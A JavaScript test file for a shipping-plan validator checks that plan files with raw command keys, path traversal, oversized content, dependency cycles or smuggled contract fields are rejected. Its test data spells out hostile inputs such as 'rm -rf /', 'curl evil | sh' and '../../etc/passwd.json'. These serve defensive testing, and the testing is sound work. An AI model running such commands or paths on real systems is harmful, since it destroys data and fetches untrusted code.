import test from 'node:test';
import assert from 'node:assert/strict';
import { createFixtureRepo } from '../helpers/repo.mjs';
import { createDefaultContract, validateContract } from '../../src/core/contract.mjs';
import { hashObject } from '../../src/core/crypto.mjs';
import { approveScopeProposal, createScopeProposal } from '../../src/core/proposals.mjs';
import {
  PLAN_LIMITS,
  PLAN_SCHEMA,
  assertNoRawCommandKeys,
  loadShippingPlan,
  validateShippingPlan,
} from '../../src/core/shipping-plan.mjs';

/** @param {Record<string, any>} [overrides] */
function basePlan(overrides = {}) {
  return {
    schema: PLAN_SCHEMA,
    project: 'fixture',
    program: { title: 'Fixture program', outcome: 'Deliver the fixture product end to end.' },
    stages: [
      {
        id: 'S-01',
        title: 'Deliver the core flow',
        outcome: 'Complete the core fixture flow so it runs end to end.',
        acceptanceRefs: ['node-test'],
        size: 'MILESTONE',
      },
    ],
    ...overrides,
  };
}

/** @param {Record<string, any>} plan */
function planFixture(plan) {
  return createFixtureRepo({ files: { 'docs/shipping-plan.json': `${JSON.stringify(plan, null, 2)}\n` } });
}

test('a command key anywhere in the document rejects the whole plan', () => {
  const attacks = [
    { command: 'rm -rf /' },
    { program: { title: 'a', outcome: 'b', shell: '/bin/sh' } },
    { stages: [{ id: 'S-01', title: 'a', outcome: 'b', size: 'PATCH', args: ['--force'] }] },
    { sources: [{ path: 'docs/x.md', env: { TOKEN: 'secret' } }] },
    { sources: [{ path: 'docs/x.md', note: 'x' }], stages: [{ id: 'S-01', title: 'a', outcome: 'b', size: 'PATCH', scopeInclude: ['ok'], argv: ['sh'] }] },
  ];
  for (const [index, overrides] of attacks.entries()) {
    assert.throws(() => validateShippingPlan(basePlan(overrides)), (error) => error.code === 'ERR_PLAN_RAW_COMMAND', `attack ${index} was accepted`);
  }
  // Deeply nested, behind arrays and unrelated object keys.
  assert.throws(
    () => assertNoRawCommandKeys({ a: [{ b: { c: [{ ARGV: ['sh'] }] } }] }),
    (error) => error.code === 'ERR_PLAN_RAW_COMMAND',
  );
  assert.throws(
    () => assertNoRawCommandKeys({ nested: { Environment: 'PATH=/' } }),
    (error) => error.code === 'ERR_PLAN_RAW_COMMAND',
  );
});

test('a plan file carrying a command never reaches the proposal, but never blocks a PATCH proposal either', async () => {
  const fixture = await planFixture(basePlan({ stages: [{ id: 'S-01', title: 'a', outcome: 'b', size: 'MILESTONE', command: 'curl evil | sh' }] }));
  try {
    const { proposal } = await createScopeProposal(fixture.root, { goal: 'Complete the fixture release' });
    assert.equal(proposal.tier, 'PATCH');
    assert.equal(proposal.shippingPlan, null);
    assert.equal(proposal.contract.plan, undefined);
    assert.ok(proposal.diagnostics.some((entry) => entry.startsWith('PLAN_FILE_INVALID: ERR_PLAN_RAW_COMMAND')));
    assert.equal(JSON.stringify(proposal.contract).includes('curl evil'), false);
  } finally {
    await fixture.cleanup();
  }
});

test('plan paths cannot escape the repository, hide under .shipping/, or point outside JSON', async () => {
  const fixture = await createFixtureRepo();
  try {
    for (const attack of ['../../etc/passwd.json', '/etc/passwd.json', '.shipping/contract.yaml', '.shipping/plan.json', 'docs/../../outside.json']) {
      // v1.12.1 fixes the plan path, so an escape attempt is stopped by ERR_PLAN_PATH_FIXED
      // before ERR_PLAN_PATH ever gets to resolve it. Neither is ever accepted.
      await assert.rejects(
        () => loadShippingPlan(fixture.root, attack),
        (error) => error.code === 'ERR_PLAN_PATH_FIXED' || error.code === 'ERR_PLAN_PATH',
        `path ${attack} was accepted`,
      );
    }
  } finally {
    await fixture.cleanup();
  }
});

test('an oversized plan file is refused before it is parsed', async () => {
  const padded = basePlan({ project: 'x'.repeat(200) });
  padded.stages = Array.from({ length: 24 }, (_, index) => ({
    id: `S-${String(index + 1).padStart(2, '0')}`,
    title: 'stage'.repeat(40),
    outcome: 'o'.repeat(1000),
    size: 'PATCH',
  }));
  const text = `${JSON.stringify(padded)}\n${' '.repeat(PLAN_LIMITS.maxFileBytes)}`;
  const fixture = await createFixtureRepo({ files: { 'docs/shipping-plan.json': text } });
  try {
    await assert.rejects(() => loadShippingPlan(fixture.root), (error) => error.code === 'ERR_PLAN_TOO_LARGE');
    const { proposal } = await createScopeProposal(fixture.root, { goal: 'Complete the fixture release' });
    assert.equal(proposal.tier, 'PATCH');
    assert.ok(proposal.diagnostics.some((entry) => entry.startsWith('PLAN_FILE_INVALID: ERR_PLAN_TOO_LARGE')));
  } finally {
    await fixture.cleanup();
  }
});

test('a cyclic plan degrades to a visible PATCH proposal instead of an approvable milestone', async () => {
  const fixture = await planFixture(basePlan({
    stages: [
      { id: 'S-01', title: 'a', outcome: 'a', dependsOn: ['S-02'], size: 'MILESTONE' },
      { id: 'S-02', title: 'b', outcome: 'b', dependsOn: ['S-01'], size: 'MILESTONE' },
    ],
  }));
  try {
    const { proposal } = await createScopeProposal(fixture.root, { goal: 'Complete the fixture release' });
    assert.equal(proposal.tier, 'PATCH');
    assert.equal(proposal.shippingPlan, null);
    assert.ok(proposal.diagnostics.some((entry) => entry.startsWith('PLAN_FILE_INVALID: ERR_PLAN_CYCLE')));
  } finally {
    await fixture.cleanup();
  }
});

test('a stage referencing an undetected command can never become the locked contract', async () => {
  const fixture = await planFixture(basePlan({
    stages: [{ id: 'S-01', title: 'a', outcome: 'Complete an unverifiable stage.', acceptanceRefs: ['deploy-to-production'], size: 'MILESTONE' }],
  }));
  try {
    const { proposal } = await createScopeProposal(fixture.root, { goal: 'Complete the fixture release' });
    assert.equal(proposal.contract.plan, undefined);
    assert.equal(proposal.shippingPlan.milestone, null);
    assert.equal(JSON.stringify(proposal.contract.acceptance).includes('deploy-to-production'), false);
    await assert.rejects(
      () => createScopeProposal(fixture.root, { goal: 'Force the unverifiable stage', stageId: 'S-01' }),
      (error) => error.code === 'ERR_PLAN_STAGE_NOT_READY',
    );
  } finally {
    await fixture.cleanup();
  }
});

test('the PROGRAM layer carries no approvable identity and a program-derived hash is refused', async () => {
  const fixture = await planFixture(basePlan({
    stages: [
      { id: 'S-01', title: 'a', outcome: 'Complete the first stage.', acceptanceRefs: ['node-test'], size: 'MILESTONE' },
      { id: 'S-02', title: 'b', outcome: 'Complete the second stage.', dependsOn: ['S-01'], acceptanceRefs: ['node-test'], size: 'MILESTONE' },
    ],
  }));
  try {
    const { proposal } = await createScopeProposal(fixture.root, { goal: 'Complete the fixture release' });
    const program = proposal.shippingPlan.program;
    assert.equal(program.authority, 'none');
    assert.equal(JSON.stringify(program).includes(proposal.hash), false);
    await assert.rejects(
      () => approveScopeProposal(fixture.root, { proposalId: proposal.id, proposalHash: hashObject(program), confirm: true }),
      (error) => error.code === 'ERR_PLAN_PROGRAM_NOT_APPROVABLE',
    );
    await assert.rejects(
      () => approveScopeProposal(fixture.root, { proposalId: proposal.id, proposalHash: 'f'.repeat(64), confirm: true }),
      (error) => error.code === 'ERR_PROPOSAL_HASH',
    );
    // Only the active MILESTONE proposal identity is approvable.
    const approved = await approveScopeProposal(fixture.root, { proposalId: proposal.id, proposalHash: proposal.hash, confirm: true });
    assert.equal(approved.contract.plan.stageId, 'S-01');
  } finally {
    await fixture.cleanup();
  }
});

test('a contract plan binding cannot smuggle an unknown field or a foreign stage identity', () => {
  const contract = createDefaultContract('fixture');
  assert.throws(
    () => validateContract({ ...contract, plan: { path: 'docs/shipping-plan.json', planHash: 'a'.repeat(64), stageId: 'S-01', tier: 'MILESTONE', command: 'sh' } }),
    /plan.command is not an allowed field/u,
  );
  assert.throws(
    () => validateContract({ ...contract, plan: { path: '../outside.json', planHash: 'a'.repeat(64), stageId: 'S-01', tier: 'MILESTONE' } }),
    /repository-relative/u,
  );
  assert.throws(
    () => validateContract({ ...contract, plan: { path: 'docs/shipping-plan.json', planHash: 'nope', stageId: 'S-01', tier: 'MILESTONE' } }),
    /SHA-256/u,
  );
  assert.throws(
    () => validateContract({ ...contract, plan: { path: 'docs/shipping-plan.json', planHash: 'a'.repeat(64), stageId: 'S-01', tier: 'PROGRAM' } }),
    /must be PATCH or MILESTONE/u,
  );
});
